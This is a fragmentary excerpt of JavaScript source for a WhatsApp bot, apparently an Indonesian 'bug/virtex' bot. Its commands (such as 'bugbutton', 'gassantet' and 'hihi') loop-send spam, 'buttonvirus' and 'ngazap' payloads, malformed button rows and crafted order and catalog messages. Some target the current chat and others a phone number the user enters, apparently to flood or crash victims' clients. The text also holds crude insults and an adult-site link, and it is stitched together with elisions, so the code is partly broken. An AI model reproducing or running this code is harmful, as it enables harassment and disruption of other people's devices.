...
user.afkReason = ''
	    ...
	    case 'yuhu': {
                ...
                user.afkReason = text
                m.reply(`${m.pushName} My Name Wranzz${text ? ': ' + text : ''}`)
            }
            break
case 'hihi': {
if (!isCreator) return
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
kontolu = '``⏤͟͞ঔৣོ⃟ཿ☔𝚆𝚊𝚕𝚣𝚃𝚑𝚎𝚁𝚊𝚒𝚗☔༃⃟⚟``',
hisoka.sendMessage(m.chat, {text: kontolu, thumbnail: thumb, quoted: m, contextInfo: { externalAdReply:{title: `${jobot}`,body: '⏤͟͞ঔৣོ⃟ཿ☔𝚆𝚊𝚕𝚣𝚃𝚑𝚎𝚁𝚊𝚒𝚗☔༃⃟⚟',previewType:"PHOTO",thumbnail: thumb,sourceUrl:`https://xnxx.com`}}})
}
}
break
case 'kuntul': {
...
hisoka.sendMessage(m.chat, {document: y1, fileName: `⏤͟͞ঔৣོ⃟ཿ☔𝚆𝚊𝚕𝚣𝚃𝚑𝚎𝚁𝚊𝚒𝚗☔༃⃟⚟ ${doc}.mp3`, quoted: m})
hisoka.sendMessage(m.chat, {document: y1, fileName: `⏤͟͞ঔৣོ⃟ཿ☔𝚆𝚊𝚕𝚣𝚃𝚑𝚎𝚁𝚊𝚒𝚗☔༃⃟⚟ ${jobot}.txt`, quoted: m})
hisoka.sendMessage(m.chat, {document: y1, fileName: `⏤͟͞ঔৣོ⃟ཿ☔𝚆𝚊𝚕𝚣𝚃𝚑𝚎𝚁𝚊𝚒𝚗☔༃⃟⚟ ${ngazap}.js`, quoted: m})
}
}
break
case 'bugbutton':{
...
kontolputralist = [
                {
                title: `༒✪͜͡★➤⃨⃞⃟ꪶ𝙒𝙧𝙖𝙣𝙯𝙯𝙯 ✇ 𝙈𝙤𝙙𝙨🜏ꫂ➤⃨⃞⃟★፝͜͡✪༒ ${ngazap} ${jobot}`,
                rows: [
                {title: buttonvirus, rowId: `asu'+$+$+$+2+#`, description: `ꪶ𝙒𝙧𝙖𝙣𝙯𝙯𝙯 ✇ 𝙈𝙤𝙙𝙨🜏ꫂ`},
                {title: buttonvirus, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay Anak" Ngentod`}
                ]
                }
                ]
                hisoka.sendListMsg(m.chat, `༒✪͜͡★➤⃨⃞⃟ꪶ𝙒𝙧𝙖𝙣𝙯𝙯𝙯 ✇ 𝙈𝙤𝙙𝙨🜏ꫂ➤⃨⃞⃟★፝͜͡✪༒`, hisoka.user.name, `Hay Ngentod`, `༒✪͜͡★➤⃨⃞⃟ꪶ𝙒𝙧𝙖𝙣𝙯𝙯𝙯 ✇ 𝙈𝙤𝙙𝙨🜏ꫂ➤⃨⃞⃟★፝͜͡✪༒`, kontolputralist, m)
                }
                }
break
case 'tagwae': {
...
if (!isCreator) return
                    a = await hisoka.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
                    await hisoka.sendMessage(m.chat, {text:"⏤͟͞ঔৣོ⃟ཿ☔𝚆𝚊𝚕𝚣𝚃𝚑𝚎𝚁𝚊𝚒𝚗☔༃⃟⚟ "}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"⏤͟͞ঔৣོ⃟ཿ☔𝚆𝚊𝚕𝚣𝚃𝚑𝚎𝚁𝚊𝚒𝚗☔༃⃟⚟"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"⏤͟͞ঔৣོ⃟ཿ☔𝚆𝚊𝚕𝚣𝚃𝚑𝚎𝚁𝚊𝚒𝚗☔༃⃟⚟"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"⏤͟͞ঔৣོ⃟ཿ☔𝚆𝚊𝚕𝚣𝚃𝚑𝚎𝚁𝚊𝚒𝚗☔༃⃟⚟"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"⏤͟͞ঔৣོ⃟ཿ☔𝚆𝚊𝚕𝚣𝚃𝚑𝚎𝚁𝚊𝚒𝚗☔༃⃟⚟"}, {quoted: a})
...
reply(m.chat, `© ⏤͟͞ঔৣོ⃟ཿ☔𝚆𝚊𝚕𝚣𝚃𝚑𝚎𝚁𝚊𝚒𝚗☔༃⃟⚟`, main)
}
}
break
//=================================================//
...
thejobot(m.chat, `© ⏤͟͞ঔৣོ⃟ཿ☔𝚆𝚊𝚕𝚣𝚃𝚑𝚎𝚁𝚊𝚒𝚗☔༃⃟⚟`, main)
}
}
break
//=================================================//
...
"status": "INQUIRY",
"surface": "CATALOG",
"message": `⏤͟͞ঔৣོ⃟ཿ☔𝚆𝚊𝚕𝚣𝚃𝚑𝚎𝚁𝚊𝚒𝚗☔༃⃟⚟ ${ngazap(prefix)}`,
"orderTitle": "thejobot",
...
review(m.chat, `© ⏤͟͞ঔৣོ⃟ཿ☔𝚆𝚊𝚕𝚣𝚃𝚑𝚎𝚁𝚊𝚒𝚗☔༃⃟⚟`, main)
}
}
break
//=================================================//
...
thejo(m.chat, `© ⏤͟͞ঔৣོ⃟ཿ☔𝚆𝚊𝚕𝚣𝚃𝚑𝚎𝚁𝚊𝚒𝚗☔༃⃟⚟`, main)
}
}
break
//=================================================//
...
"caption": `⏤͟͞ঔৣོ⃟ཿ☔𝚆𝚊𝚕𝚣𝚃𝚑𝚎𝚁𝚊𝚒𝚗☔༃⃟⚟ ${ngazap(prefix)}`
 }
   }
}
bacit(m.chat, `© ⏤͟͞ঔৣོ⃟ཿ☔𝚆𝚊𝚕𝚣𝚃𝚑𝚎𝚁𝚊𝚒𝚗☔༃⃟⚟`, main)
}
}
break
//=================================================//
...
bacot(m.chat, `© ⏤͟͞ঔৣོ⃟ཿ☔𝚆𝚊𝚕𝚣𝚃𝚑𝚎𝚁𝚊𝚒𝚗☔༃⃟⚟`, main)
}
}
break
...
`
   ...
   hey = fs.readFileSync('Diputusin.mp3')
...
for (let i = 0; i < jumlah; i++) {
  ...
  {buttonId: 'babababbababa', buttonText: {displayText: jobot}, type: 1}
          ...
          if (!text) throw `Nomernya mana?`
            ...
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"⏤͟͞ঔৣོ⃟ཿ☔𝚆𝚊𝚕𝚣𝚃𝚑𝚎𝚁𝚊𝚒𝚗☔༃⃟⚟"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"⏤͟͞ঔৣོ⃟ཿ☔𝚆𝚊𝚕𝚣𝚃𝚑𝚎𝚁𝚊𝚒𝚗☔༃⃟⚟"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"⏤͟͞ঔৣོ⃟ཿ☔𝚆𝚊𝚕𝚣𝚃𝚑𝚎𝚁𝚊𝚒𝚗☔༃⃟⚟"},{quoted:asukonyol11})
        ...
        case 'gassantet': {          
          ...
          if (!text) throw `Nomernya mana?`
            ...
            await hisoka.sendMessage(m.chat, {text:"⏤͟͞ঔৣོ⃟ཿ☔𝚆𝚊𝚕𝚣𝚃𝚑𝚎𝚁𝚊𝚒𝚗☔༃⃟⚟"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"⏤͟͞ঔৣོ⃟ཿ☔𝚆𝚊𝚕𝚣𝚃𝚑𝚎𝚁𝚊𝚒𝚗☔༃⃟⚟"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"⏤͟͞ঔৣོ⃟ཿ☔𝚆𝚊𝚕𝚣𝚃𝚑𝚎𝚁𝚊𝚒𝚗☔༃⃟⚟"},{quoted:asukonyol11})
...
a = await hisoka.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
	...
	"message": ` 😈⏤͟͞ঔৣོ⃟ཿ☔𝚆𝚊𝚕𝚣𝚃𝚑𝚎𝚁𝚊𝚒𝚗☔༃⃟⚟ ${philips} ${ngazap(prefix)}`,
...
"description": `© ⏤͟͞ঔৣོ⃟ཿ☔𝚆𝚊𝚕𝚣𝚃𝚑𝚎𝚁𝚊𝚒𝚗☔༃⃟⚟ ${buttonvirus}`,
"currencyCode": "IDR",
"footerText": `© ⏤͟͞ঔৣོ⃟ཿ☔𝚆𝚊𝚕𝚣𝚃𝚑𝚎𝚁𝚊𝚒𝚗☔༃⃟⚟`,
